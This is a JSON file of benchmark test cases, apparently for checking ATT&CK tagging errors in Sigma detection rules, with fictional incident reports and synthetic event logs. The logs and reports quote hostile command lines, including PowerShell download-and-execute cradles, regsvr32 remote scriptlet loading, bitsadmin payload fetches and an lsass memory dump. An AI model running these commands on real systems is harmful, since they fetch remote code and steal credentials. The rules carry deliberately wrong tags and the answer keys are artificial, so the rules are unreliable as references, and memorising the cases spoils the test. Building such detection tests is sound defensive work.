@@ -1,0 +1,507 @@
+{
+ "cases": [
+  {
+   "assumptions": [],
+   "defect_class": "D8",
+   "evasive": false,
+   "events": {
+    "lookalike": [
+     {
+      "cmd": "powershell.exe -NoProfile -WindowStyle Hidden -File C:\\Scripts\\rotate-logs.ps1",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\svchost.exe",
+      "parent_cmd": "svchost.exe -k netsvcs",
+      "user": "LAB\\svc-backup"
+     },
+     {
+      "cmd": "powershell.exe -NoProfile -Command (New-Object Net.WebClient).DownloadString('http://intranet.harbourline.example/inventory.txt')",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "explorer.exe",
+      "user": "LAB\\carol"
+     }
+    ],
+    "negative": [
+     {
+      "cmd": "cmd.exe /c ipconfig /all",
+      "image": "C:\\Windows\\System32\\cmd.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "explorer.exe",
+      "user": "LAB\\alice"
+     },
+     {
+      "cmd": "notepad.exe C:\\Users\\alice\\notes.txt",
+      "image": "C:\\Windows\\System32\\notepad.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "explorer.exe",
+      "user": "LAB\\alice"
+     }
+    ],
+    "positive": [
+     {
+      "cmd": "powershell.exe -NoProfile -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString('http://stage.harbourline-update.test/a.ps1')",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "explorer.exe",
+      "user": "LAB\\alice"
+     },
+     {
+      "cmd": "powershell.exe -nop -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString('http://stage.harbourline-update.test/c9.ps1')",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "explorer.exe",
+      "user": "LAB\\bob"
+     }
+    ]
+   },
+   "evidence": [
+    "powershell.exe -NoProfile -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString('http://stage.harbourline-update.test/a.ps1')",
+    "a hidden PowerShell one-liner launched from a malicious shortcut file"
+   ],
+   "expected_gate": "G7",
+   "id": "D8-01",
+   "logsource": "windows_process_creation",
+   "report_text": "Incident summary, Harbourline Freight (fictional logistics provider). The intruder's first execution step on each workstation was a hidden PowerShell one-liner launched from a malicious shortcut file that the user opened from a phishing attachment. The recovered process command line was: powershell.exe -NoProfile -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString('http://stage.harbourline-update.test/a.ps1') and the parent process was explorer.exe, which is consistent with a user double-clicking the shortcut. The script retrieved a second-stage loader and exited within seconds. The same pattern appeared on three workstations over two days, each time with a different script name on the staging host. No scheduled tasks, services or registry changes were attributed to the actor during this phase, and no other script interpreter was involved. Defenders should therefore focus on the hidden, inline download-and-execute launch rather than on the second-stage payload, which changed per host.",
+   "role": "defective",
+   "sigma_yaml": "title: Hidden PowerShell Inline Download Cradle\nid: 3f6c2a1e-8b47-4d09-9a52-7e1c0b5d2f81\nstatus: experimental\ndescription: Detects a hidden-window PowerShell launch that downloads a remote script inline with Net.WebClient DownloadString.\nreferences:\n  - urn:atidep:case\nauthor: case-author\ndate: 2026/10/02\ntags:\n  - attack.execution\n  - attack.t1059.099\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\powershell.exe'\n    CommandLine|contains|all:\n      - 'WindowStyle Hidden'\n      - 'Net.WebClient'\n      - 'DownloadString'\n  condition: selection\nfalsepositives:\n  - Administrative scripts that fetch configuration from an internal host with a hidden window\nlevel: high\n",
+   "tamper_sigma_yaml": "",
+   "techniques": [
+    "T1059.001"
+   ],
+   "why": "The tag attack.t1059.099 is not a real ATT&CK technique: T1059 has no sub-technique .099. The report supports T1059.001 (PowerShell) only; the detection logic and the other metadata are sound."
+  },
+  {
+   "assumptions": [],
+   "defect_class": "D8",
+   "evasive": false,
+   "events": {
+    "lookalike": [
+     {
+      "cmd": "regsvr32.exe /s C:\\Vendor\\Viewer\\cviewer.dll",
+      "image": "C:\\Windows\\System32\\regsvr32.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\msiexec.exe",
+      "parent_cmd": "msiexec.exe /V",
+      "user": "NT AUTHORITY\\SYSTEM"
+     },
+     {
+      "cmd": "regsvr32.exe /u /s C:\\Windows\\System32\\msxml3.dll",
+      "image": "C:\\Windows\\System32\\regsvr32.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\svc-deploy"
+     }
+    ],
+    "negative": [
+     {
+      "cmd": "ping.exe -n 2 192.0.2.10",
+      "image": "C:\\Windows\\System32\\ping.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\dan"
+     },
+     {
+      "cmd": "mspaint.exe",
+      "image": "C:\\Windows\\System32\\mspaint.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "explorer.exe",
+      "user": "LAB\\carol"
+     }
+    ],
+    "positive": [
+     {
+      "cmd": "regsvr32.exe /s /n /u /i:http://files.brackenridge-docs.test/p.sct scrobj.dll",
+      "image": "C:\\Windows\\System32\\regsvr32.exe",
+      "kind": "process_create",
+      "parent": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+      "parent_cmd": "WINWORD.EXE /n C:\\Users\\carol\\Documents\\claim-form.docm",
+      "user": "LAB\\carol"
+     },
+     {
+      "cmd": "regsvr32 /s /n /u /i:http://files.brackenridge-docs.test/q7.sct scrobj.dll",
+      "image": "C:\\Windows\\SysWOW64\\regsvr32.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\dan"
+     }
+    ]
+   },
+   "evidence": [
+    "regsvr32.exe /s /n /u /i:http://files.brackenridge-docs.test/p.sct scrobj.dll",
+    "regsvr32 loading scrobj.dll with an HTTP location passed to the /i switch"
+   ],
+   "expected_gate": "G7",
+   "id": "D8-02",
+   "logsource": "windows_process_creation",
+   "report_text": "Incident summary, Brackenridge Mutual (fictional insurer). After a user enabled macros in a received claims form, the Word process started a signed Windows binary to fetch and run a remote scriptlet without writing a DLL to disk. Responders recovered this command line: regsvr32.exe /s /n /u /i:http://files.brackenridge-docs.test/p.sct scrobj.dll and noted that the parent process was WINWORD.EXE. The scriptlet launched a small downloader which contacted the same staging host. Analysts stressed that the abuse is of regsvr32 loading scrobj.dll with an HTTP location passed to the /i switch; ordinary use of regsvr32 to register a local COM library does not use that combination. The behaviour was seen on four hosts, with the staging path differing slightly on each. No other signed-binary proxies were observed in the same time window, and no credential access or persistence was linked to this step.",
+   "role": "defective",
+   "sigma_yaml": "title: Regsvr32 Remote Scriptlet Execution via Scrobj\nid: a91d7e34-52c6-4f18-b0a3-6d84e2c97f15\nstatus: experimental\ndescription: Detects regsvr32 loading scrobj.dll with an HTTP location supplied to the /i switch.\nreferences:\n  - urn:atidep:case\nauthor: case-author\ndate: 2026/10/02\ntags:\n  - attack.stealth\n  - attack.t1117\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\regsvr32.exe'\n    CommandLine|contains|all:\n      - 'scrobj.dll'\n      - '/i:http'\n  condition: selection\nfalsepositives:\n  - Software installers that register COM scriptlets from an internal web server\nlevel: high\n",
+   "tamper_sigma_yaml": "",
+   "techniques": [
+    "T1218.010"
+   ],
+   "why": "The tag attack.t1117 is a revoked/deprecated ATT&CK ID (Regsvr32 was folded into T1218.010), so it is not active in the pinned release and is not the technique the report cites. The tactic attack.stealth and the detection logic are correct."
+  },
+  {
+   "assumptions": [],
+   "defect_class": "D8",
+   "evasive": true,
+   "events": {
+    "lookalike": [
+     {
+      "cmd": "bitsadmin.exe /list /allusers /verbose",
+      "image": "C:\\Windows\\System32\\bitsadmin.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\svc-helpdesk"
+     },
+     {
+      "cmd": "bitsadmin.exe /info syncjob /verbose",
+      "image": "C:\\Windows\\System32\\bitsadmin.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\svc-helpdesk"
+     }
+    ],
+    "negative": [
+     {
+      "cmd": "ipconfig.exe /all",
+      "image": "C:\\Windows\\System32\\ipconfig.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\frank"
+     },
+     {
+      "cmd": "notepad.exe",
+      "image": "C:\\Windows\\System32\\notepad.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "explorer.exe",
+      "user": "LAB\\gina"
+     }
+    ],
+    "positive": [
+     {
+      "cmd": "bitsadmin.exe /transfer syncjob /download /priority normal http://dl.marrowgate-support.test/agent.bin C:\\ProgramData\\agent.bin",
+      "image": "C:\\Windows\\System32\\bitsadmin.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\frank"
+     },
+     {
+      "cmd": "bitsadmin /transfer updjob /download /priority high http://dl.marrowgate-support.test/cfg.dat C:\\Users\\Public\\cfg.dat",
+      "image": "C:\\Windows\\System32\\bitsadmin.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\gina"
+     }
+    ]
+   },
+   "evidence": [
+    "bitsadmin.exe /transfer syncjob /download /priority normal http://dl.marrowgate-support.test/agent.bin C:\\ProgramData\\agent.bin",
+    "the use of bitsadmin with the /transfer and /download switches against an external URL"
+   ],
+   "expected_gate": "G7",
+   "id": "D8-03",
+   "logsource": "windows_process_creation",
+   "report_text": "Incident summary, Marrowgate Health (fictional hospital group). The actor used the Windows Background Intelligent Transfer Service as a quiet way to pull a payload from an external host onto the endpoint. On the first affected workstation the process log showed: bitsadmin.exe /transfer syncjob /download /priority normal http://dl.marrowgate-support.test/agent.bin C:\\ProgramData\\agent.bin and the same job name was reused on later hosts. The transfer job outlived a reboot of the host, and the downloaded file was then started by a separate command. The analysts' assessment is that the use of bitsadmin with the /transfer and /download switches against an external URL has no legitimate business purpose in this environment, whereas read-only job listing is routine for the service desk. The activity was limited to BITS job abuse in this phase; no other transfer utilities such as certutil were seen.",
+   "role": "defective",
+   "sigma_yaml": "title: BITS Job Download Via Bitsadmin Transfer\nid: 5b08e6c2-1d93-47aa-8e61-c3f20a74d9b6\nstatus: experimental\ndescription: Detects bitsadmin creating a download transfer job, a quiet way to pull a payload onto an endpoint.\nreferences:\n  - urn:atidep:case\nauthor: case-author\ndate: 2026/10/02\ntags:\n  - attack.execution\n  - attack.persistence\n  - attack.defense_evasion\n  - attack.t1197\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\bitsadmin.exe'\n    CommandLine|contains|all:\n      - '/transfer'\n      - '/download'\n  condition: selection\nfalsepositives:\n  - Administrators scripting BITS downloads of software packages from an internal server\nlevel: medium\n",
+   "tamper_sigma_yaml": "",
+   "techniques": [
+    "T1197"
+   ],
+   "why": "attack.defense_evasion is a tactic name that no longer exists in ATT&CK v19.2 (it was renamed attack.stealth). The technique ID attack.t1197 and the other two tactic tags are correct and supported, so only the stale tactic name is wrong."
+  },
+  {
+   "assumptions": [],
+   "defect_class": "D8",
+   "evasive": true,
+   "events": {
+    "lookalike": [
+     {
+      "cmd": "rundll32.exe shell32.dll,Control_RunDLL desk.cpl",
+      "image": "C:\\Windows\\System32\\rundll32.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "explorer.exe",
+      "user": "LAB\\dave"
+     },
+     {
+      "cmd": "rundll32.exe url.dll,FileProtocolHandler https://intranet.tessellate.example/",
+      "image": "C:\\Windows\\System32\\rundll32.exe",
+      "kind": "process_create",
+      "parent": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+      "parent_cmd": "chrome.exe",
+      "user": "LAB\\erin"
+     }
+    ],
+    "negative": [
+     {
+      "cmd": "ping.exe -n 2 192.0.2.10",
+      "image": "C:\\Windows\\System32\\ping.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\dave"
+     },
+     {
+      "cmd": "calc.exe",
+      "image": "C:\\Windows\\System32\\calc.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "explorer.exe",
+      "user": "LAB\\erin"
+     }
+    ],
+    "positive": [
+     {
+      "cmd": "rundll32.exe C:\\Users\\Public\\Libraries\\netprov.dll,Start",
+      "image": "C:\\Windows\\System32\\rundll32.exe",
+      "kind": "process_create",
+      "parent": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+      "parent_cmd": "WINWORD.EXE /n C:\\Users\\dave\\Documents\\PO-4471.docm",
+      "user": "LAB\\dave"
+     },
+     {
+      "cmd": "rundll32.exe C:\\Users\\Public\\Libraries\\lanprov.dll,Start",
+      "image": "C:\\Windows\\System32\\rundll32.exe",
+      "kind": "process_create",
+      "parent": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+      "parent_cmd": "WINWORD.EXE /n C:\\Users\\erin\\Documents\\PO-5530.docm",
+      "user": "LAB\\erin"
+     }
+    ]
+   },
+   "evidence": [
+    "WINWORD.EXE spawned rundll32.exe with the command line rundll32.exe C:\\Users\\Public\\Libraries\\netprov.dll,Start",
+    "the combination of an Office parent and a DLL,export argument is the reliable signal"
+   ],
+   "expected_gate": "G7",
+   "id": "D8-04",
+   "logsource": "windows_process_creation",
+   "report_text": "Incident summary, Tessellate Components (fictional manufacturer). A purchase-order document delivered by email led to a macro that dropped a DLL into a public profile folder and loaded it through the Windows DLL host. The process tree showed WINWORD.EXE spawned rundll32.exe with the command line rundll32.exe C:\\Users\\Public\\Libraries\\netprov.dll,Start and the DLL then opened an outbound session to the actor. Analysts noted that Office applications almost never start rundll32 to load a DLL by export name in this environment, so the combination of an Office parent and a DLL,export argument is the reliable signal. The DLL file name changed between the three affected hosts but the export name did not. Nothing in the report indicates the DLL was installed for persistence or that other binaries were used as proxies.",
+   "role": "defective",
+   "sigma_yaml": "title: Rundll32 Spawned by Word Loading a DLL by Export\nid: e2740b9d-6a15-4c3e-93f8-1b5d8a06c427\nstatus: experimental\ndescription: Detects rundll32 started by Word with a DLL and export name argument.\nreferences:\n  - urn:atidep:case\nauthor: case-author\ndate: 2026/10/02\ntags:\n  - attack.execution\n  - attack.stealth\n  - attack.t1218.011\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\rundll32.exe'\n    ParentImage|endswith: '\\winword.exe'\n    CommandLine|contains: '.dll,'\n  condition: selection\nfalsepositives:\n  - Word add-ins or document features that legitimately call rundll32 with a DLL export\nlevel: high\n",
+   "tamper_sigma_yaml": "",
+   "techniques": [
+    "T1218.011"
+   ],
+   "why": "T1218.011 (Rundll32) maps only to the stealth tactic in v19.2; the extra attack.execution tag is a valid tactic name but not a tactic of this technique, so the tactic list is inconsistent with the technique even though the technique ID is correct and supported."
+  },
+  {
+   "assumptions": [],
+   "defect_class": "D8",
+   "evasive": true,
+   "events": {
+    "lookalike": [
+     {
+      "dest_ip": "198.51.100.77",
+      "dest_port": "4444",
+      "image": "C:\\Program Files\\Java\\jre\\bin\\java.exe",
+      "kind": "network_connect"
+     },
+     {
+      "dest_ip": "192.0.2.80",
+      "dest_port": "4444",
+      "image": "C:\\Program Files\\nodejs\\node.exe",
+      "kind": "network_connect"
+     }
+    ],
+    "negative": [
+     {
+      "dest_ip": "198.51.100.20",
+      "dest_port": "443",
+      "image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+      "kind": "network_connect"
+     },
+     {
+      "dest_ip": "198.51.100.31",
+      "dest_port": "443",
+      "image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
+      "kind": "network_connect"
+     }
+    ],
+    "positive": [
+     {
+      "dest_ip": "203.0.113.50",
+      "dest_port": "4444",
+      "image": "C:\\Users\\Public\\svchelper.exe",
+      "kind": "network_connect"
+     },
+     {
+      "dest_ip": "203.0.113.50",
+      "dest_port": "4444",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "network_connect"
+     }
+    ]
+   },
+   "evidence": [
+    "outbound connections to 203.0.113.50 on port 4444",
+    "the choice of port 4444 for traffic that is not web or remote-administration traffic"
+   ],
+   "expected_gate": "G7",
+   "id": "D8-05",
+   "logsource": "windows_network_connection",
+   "report_text": "Incident summary, Sandrift Utilities (fictional water company). A custom backdoor named svchelper.exe, placed in a public profile folder, called back to the operator over a raw TCP channel rather than over web ports. Network telemetry showed the implant making outbound connections to 203.0.113.50 on port 4444, repeated every few minutes, and a follow-on PowerShell process used the same destination. Analysts highlighted that the protocol is bespoke and that the choice of port 4444 for traffic that is not web or remote-administration traffic is what makes it stand out in this environment. The operators did not install or abuse any legitimate remote-administration or screen-sharing product; all control traffic used the custom implant. The infrastructure address was stable for the whole eleven-day intrusion.",
+   "role": "defective",
+   "sigma_yaml": "title: Outbound TCP 4444 Connection to Known Implant Controller\nid: 7c3a95f1-0e28-4b6d-a4d7-92f1e8035b6c\nstatus: experimental\ndescription: Detects outbound connections to the controller address on the non-standard port 4444 observed in the intrusion.\nreferences:\n  - urn:atidep:case\nauthor: case-author\ndate: 2026/10/02\ntags:\n  - attack.command_and_control\n  - attack.t1219\nlogsource:\n  category: network_connection\n  product: windows\ndetection:\n  selection:\n    DestinationIp: '203.0.113.50'\n    DestinationPort: '4444'\n  condition: selection\nfalsepositives:\n  - Authorized red team exercises that reuse the same infrastructure address\nlevel: high\n",
+   "tamper_sigma_yaml": "",
+   "techniques": [
+    "T1571"
+   ],
+   "why": "T1219 (Remote Access Tools) is a real, active technique and its tactic command_and_control is valid, but the report supports only T1571 (Non-Standard Port) and states that no remote-administration product was used; the tagged technique has no support in the report or any declared assumption."
+  },
+  {
+   "assumptions": [],
+   "defect_class": "D8",
+   "evasive": true,
+   "events": {
+    "lookalike": [
+     {
+      "image": "C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe",
+      "kind": "dns_query",
+      "name": "www.valleycu-status.invalid"
+     },
+     {
+      "image": "C:\\Program Files\\MonAgent\\monagent.exe",
+      "kind": "dns_query",
+      "name": "heartbeat.relay-monitor.valleycu.example"
+     }
+    ],
+    "negative": [
+     {
+      "image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+      "kind": "dns_query",
+      "name": "www.valleycu.example"
+     },
+     {
+      "image": "C:\\Windows\\System32\\svchost.exe",
+      "kind": "dns_query",
+      "name": "update.vendor.example"
+     }
+    ],
+    "positive": [
+     {
+      "image": "C:\\Users\\Public\\palelib.exe",
+      "kind": "dns_query",
+      "name": "t7q2.relay-check.valleycu-status.invalid"
+     },
+     {
+      "image": "C:\\ProgramData\\Intel\\igfxsvc.exe",
+      "kind": "dns_query",
+      "name": "k3m9.relay-check.valleycu-status.invalid"
+     }
+    ]
+   },
+   "evidence": [
+    "resolving a fresh, short, random subdomain of a dedicated parent zone roughly every ninety seconds, for example t7q2.relay-check.valleycu-status.invalid",
+    "Any lookup for a name under the relay-check zone should be treated as hostile on this network"
+   ],
+   "expected_gate": "G7",
+   "id": "D8-06",
+   "logsource": "windows_dns_query",
+   "report_text": "Incident summary, Valley Credit Union (fictional). A memory-resident implant, tracked by the responders as PaleHarrow, polled its controller by resolving a fresh, short, random subdomain of a dedicated parent zone roughly every ninety seconds, for example t7q2.relay-check.valleycu-status.invalid, and decoded operator tasking from the DNS answers. All queries came from the implant's host process and none came from a browser. The responders saw no large outbound transfers and found no sign of data staging, so the DNS channel was assessed only as a command channel for the implant, not as a path for taking data out. Any lookup for a name under the relay-check zone should be treated as hostile on this network, because the zone is not used by any business system.",
+   "role": "defective",
+   "sigma_yaml": "title: DNS Queries to Relay-Check Controller Zone\nid: 18d4f7a6-93be-4e50-8c12-5a67b0d3e94f\nstatus: experimental\ndescription: Detects DNS lookups for names under the dedicated implant controller zone used for tasking polls.\nreferences:\n  - urn:atidep:case\nauthor: case-author\ndate: 2026/10/02\ntags:\n  - attack.command_and_control\nlogsource:\n  category: dns_query\n  product: windows\ndetection:\n  selection:\n    QueryName|endswith: '.relay-check.valleycu-status.invalid'\n  condition: selection\nfalsepositives:\n  - Security researchers sinkholing or probing the controller zone\nlevel: high\n",
+   "tamper_sigma_yaml": "",
+   "techniques": [
+    "T1071.004"
+   ],
+   "why": "The tags list contains only the tactic attack.command_and_control and no technique tag at all, although the report supports T1071.004; every tag present is individually valid, but G7 requires at least one technique tag."
+  },
+  {
+   "assumptions": [],
+   "defect_class": "D8",
+   "evasive": true,
+   "events": {
+    "lookalike": [
+     {
+      "cmd": "procdump.exe -accepteula -ma w3wp.exe C:\\Diag\\w3wp.dmp",
+      "image": "C:\\Tools\\Sysinternals\\procdump.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\svc-webops"
+     },
+     {
+      "cmd": "tasklist.exe /fi imagename eq lsass.exe",
+      "image": "C:\\Windows\\System32\\tasklist.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\svc-webops"
+     }
+    ],
+    "negative": [
+     {
+      "cmd": "ipconfig.exe /all",
+      "image": "C:\\Windows\\System32\\ipconfig.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\hank"
+     },
+     {
+      "cmd": "notepad.exe",
+      "image": "C:\\Windows\\System32\\notepad.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "explorer.exe",
+      "user": "LAB\\hank"
+     }
+    ],
+    "positive": [
+     {
+      "cmd": "procdump.exe -accepteula -ma lsass.exe C:\\Windows\\Temp\\ls.dmp",
+      "image": "C:\\Tools\\Sysinternals\\procdump.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\admin-ops"
+     },
+     {
+      "cmd": "pd64.exe -ma lsass.exe C:\\Users\\Public\\x.dmp",
+      "image": "C:\\Users\\Public\\pd64.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\admin-ops"
+     }
+    ]
+   },
+   "evidence": [
+    "procdump.exe -accepteula -ma lsass.exe C:\\Windows\\Temp\\ls.dmp",
+    "pd64.exe -ma lsass.exe C:\\Users\\Public\\x.dmp",
+    "the reliable signal is the full-memory switch aimed at lsass rather than the tool name"
+   ],
+   "expected_gate": "G7",
+   "id": "D8-07",
+   "logsource": "windows_process_creation",
+   "report_text": "Incident summary, Corvane Grid Services (fictional utility). After gaining local administrator rights on a file server, the operator dumped the memory of the Windows security authority process using the Sysinternals ProcDump utility, then copied the dump off the host. The recovered command line was: procdump.exe -accepteula -ma lsass.exe C:\\Windows\\Temp\\ls.dmp and later in the intrusion a renamed copy of the tool was used with the same arguments, for example pd64.exe -ma lsass.exe C:\\Users\\Public\\x.dmp. The parent process in each case was cmd.exe. Administrators do use ProcDump to capture crash dumps of line-of-business services, so the reliable signal is the full-memory switch aimed at lsass rather than the tool name. The dump was parsed offline; no other credential-access techniques were reported in this phase.",
+   "role": "defective",
+   "sigma_yaml": "title: ProcDump Full Memory Dump of LSASS\nid: c60e2b83-4f79-4a1d-b5e0-38d9a7c1f624\nstatus: experimental\ndescription: Detects a full-memory dump of the lsass process through ProcDump switches, including renamed copies of the tool.\nreferences:\n  - urn:atidep:case\nauthor: case-author\ndate: 2026/10/02\ntags:\n  - attack.credential_access\n  - attack.t1003\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    CommandLine|contains|all:\n      - '-ma'\n      - 'lsass'\n  condition: selection\nfalsepositives:\n  - Authorised diagnostic collection of LSASS crash dumps by support engineers\nlevel: high\n",
+   "tamper_sigma_yaml": "",
+   "techniques": [
+    "T1003.001"
+   ],
+   "why": "The rule is tagged with the parent technique attack.t1003 (OS Credential Dumping), but the report supports only the sub-technique T1003.001 (LSASS Memory), which is not tagged; the parent ID is real and the tactic is valid, so only the granularity of the mapping is wrong."
+  }
+ ]
+}
